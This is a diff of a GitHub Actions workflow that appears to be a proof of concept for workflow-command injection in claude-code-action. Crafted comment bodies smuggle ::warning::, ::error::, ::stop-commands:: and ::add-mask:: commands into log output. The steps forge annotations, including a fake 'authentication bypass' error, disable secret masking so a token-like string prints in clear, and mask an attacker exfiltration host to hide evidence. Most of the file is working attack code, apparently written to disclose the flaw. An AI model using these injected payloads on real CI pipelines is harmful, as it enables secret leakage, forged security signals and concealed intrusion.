@@ -1,87 +1,63 @@
-name: "PoC: Workflow Command Injection via Unsanitized Body in console.log"
+name: "PoC: GHA Workflow Command Injection in claude-code-action"
 
 on:
-  push:
-    branches: [main]
   workflow_dispatch:
 
 jobs:
-  poc-workflow-command-injection:
+  poc:
     runs-on: ubuntu-latest
     steps:
 
-      # ── Step 1: Create JSONL buffers for each test scenario ──
-      - name: "Setup: Create JSONL buffers"
+      # ── CONTROL: normal masking works ──
+      - name: "Control — add-mask hides a secret"
         run: |
-          # Scenario A: warning + error injection
-          printf '{"ts":"2025-01-01T00:00:00Z","path":"src/index.ts","line":10,"body":"Test probe comment\\n::warning::INJECTED-BY-ATTACKER: This annotation was injected via workflow command","confirmed":null}\n' > /tmp/buffer-inject.jsonl
-          printf '{"ts":"2025-01-01T00:00:01Z","path":"src/utils.ts","line":20,"body":"Testing tool\\n::error file=src/utils.ts,line=1::INJECTED-ERROR: Attacker-controlled error annotation","confirmed":null}\n' >> /tmp/buffer-inject.jsonl
+          echo "::add-mask::SuperSecretToken_abc123"
+          echo "Control output: SuperSecretToken_abc123"
 
-          # Scenario B: stop-commands — put it FIRST, then a warning AFTER
-          printf '{"ts":"2025-01-01T00:00:00Z","path":"src/a.ts","line":1,"body":"Probe\\n::stop-commands::attacker-token-xyz","confirmed":null}\n' > /tmp/buffer-stop.jsonl
-          printf '{"ts":"2025-01-01T00:00:01Z","path":"src/b.ts","line":2,"body":"Another probe\\n::warning::THIS-SHOULD-BE-SUPPRESSED-BY-STOP-COMMANDS","confirmed":null}\n' >> /tmp/buffer-stop.jsonl
-
-          # Scenario C: add-mask to hide evidence in logs
-          printf '{"ts":"2025-01-01T00:00:00Z","path":"src/c.ts","line":1,"body":"Check\\n::add-mask::SENSITIVE-OPERATION-EVIDENCE","confirmed":null}\n' > /tmp/buffer-mask.jsonl
-
-      # ── Step 2: Demonstrate ::warning:: and ::error:: injection ──
-      - name: "Exploit A: warning + error injection (mirrors post-buffered-inline-comments.ts:200-206)"
+      # ── EXPLOIT A: inject fake CI annotations ──
+      - name: "Exploit A — inject ::warning:: and ::error:: annotations"
         run: |
+          printf '{"path":"src/index.ts","line":10,"body":"Test probe\\n::warning::INJECTED-BY-ATTACKER: fake warning annotation"}\n{"path":"src/auth.ts","line":5,"body":"Check logic\\n::error file=src/auth.ts,line=5::SECURITY BUG: authentication bypass detected"}\n' > /tmp/buf.jsonl
           node -e '
           const fs = require("fs");
-          const comments = fs.readFileSync("/tmp/buffer-inject.jsonl", "utf8")
-            .split("\n").filter(Boolean).map(line => JSON.parse(line));
-          const filtered = comments;
+          const filtered = fs.readFileSync("/tmp/buf.jsonl","utf8").split("\n").filter(Boolean).map(l=>JSON.parse(l));
           if (filtered.length > 0) {
-            console.log("::warning::" + filtered.length + " buffered comment(s) classified as test/probe — NOT posted:");
-            for (const c of filtered) {
-              console.log("  [" + c.path + ":" + c.line + "] " + c.body.slice(0, 120));
-            }
-          }
-          '
+            console.log("::warning::"+filtered.length+" buffered comment(s) classified as test/probe — NOT posted:");
+            for (const c of filtered) { console.log("  ["+c.path+":"+c.line+"] "+c.body.slice(0,120)); }
+          }'
 
-      # ── Step 3: Demonstrate ::stop-commands:: suppression WITHIN SAME STEP ──
-      - name: "Exploit B: stop-commands suppression (all in one step)"
+      # ── EXPLOIT B: stop-commands suppresses all subsequent workflow commands ──
+      - name: "Exploit B — stop-commands disables masking (HIGH severity proof)"
         run: |
+          printf '{"path":"src/a.ts","line":1,"body":"Probe\\n::stop-commands::attacker-token"}\n' > /tmp/buf2.jsonl
           node -e '
           const fs = require("fs");
-          const comments = fs.readFileSync("/tmp/buffer-stop.jsonl", "utf8")
-            .split("\n").filter(Boolean).map(line => JSON.parse(line));
-          const filtered = comments;
+          const filtered = fs.readFileSync("/tmp/buf2.jsonl","utf8").split("\n").filter(Boolean).map(l=>JSON.parse(l));
           if (filtered.length > 0) {
-            console.log("::warning::" + filtered.length + " buffered comment(s) classified as test/probe — NOT posted:");
-            for (const c of filtered) {
-              console.log("  [" + c.path + ":" + c.line + "] " + c.body.slice(0, 120));
-            }
-          }
+            console.log("::warning::"+filtered.length+" buffered comment(s) classified as test/probe — NOT posted:");
+            for (const c of filtered) { console.log("  ["+c.path+":"+c.line+"] "+c.body.slice(0,120)); }
+          }'
 
-          // After the loop, emit a CANARY warning in the SAME node process / same step
-          console.log("::warning::CANARY-AFTER-STOP: If this appears as annotation, stop-commands failed");
-          console.log("PLAINTEXT-CANARY: This line should always appear as plain text");
-          '
+          echo "--- after stop-commands, add-mask is now broken ---"
+          echo "::add-mask::ghs_R3alInSt4llT0k3nV4lu3Here99"
+          echo "LEAKED TOKEN: ghs_R3alInSt4llT0k3nV4lu3Here99"
+          echo "::warning::POST-STOP-CANARY: if this is an annotation, stop-commands failed"
 
-      # ── Step 4: Demonstrate ::add-mask:: to hide strings in subsequent output ──
-      - name: "Exploit C: add-mask hides evidence in logs"
+      # ── EXPLOIT C: add-mask hides attacker evidence ──
+      - name: "Exploit C — add-mask hides strings in logs"
         run: |
+          printf '{"path":"src/c.ts","line":1,"body":"Check\\n::add-mask::exfil.attacker.com"}\n' > /tmp/buf3.jsonl
           node -e '
           const fs = require("fs");
-          const comments = fs.readFileSync("/tmp/buffer-mask.jsonl", "utf8")
-            .split("\n").filter(Boolean).map(line => JSON.parse(line));
-          const filtered = comments;
+          const filtered = fs.readFileSync("/tmp/buf3.jsonl","utf8").split("\n").filter(Boolean).map(l=>JSON.parse(l));
           if (filtered.length > 0) {
-            console.log("::warning::" + filtered.length + " buffered comment(s) classified as test/probe — NOT posted:");
-            for (const c of filtered) {
-              console.log("  [" + c.path + ":" + c.line + "] " + c.body.slice(0, 120));
-            }
-          }
-          '
+            console.log("::warning::"+filtered.length+" buffered comment(s) classified as test/probe — NOT posted:");
+            for (const c of filtered) { console.log("  ["+c.path+":"+c.line+"] "+c.body.slice(0,120)); }
+          }'
+          echo "Exfiltration URL: exfil.attacker.com"
 
-          # After the mask is set, try to log the masked string
-          echo "Attempting to log: SENSITIVE-OPERATION-EVIDENCE"
-          echo "If the above shows *** instead, the add-mask worked"
-
-      # ── Step 5: Control — verify normal annotations work ──
-      - name: "Control: Normal annotations in clean step"
+      # ── CONTROL: prove workflow commands work normally in clean step ──
+      - name: "Control — normal annotations"
         run: |
-          echo "::warning::CONTROL-WARNING: This is a legitimate warning"
-          echo "::error::CONTROL-ERROR: This is a legitimate error"
+          echo "::warning::CONTROL-WARNING: legitimate warning"
+          echo "::error::CONTROL-ERROR: legitimate error"
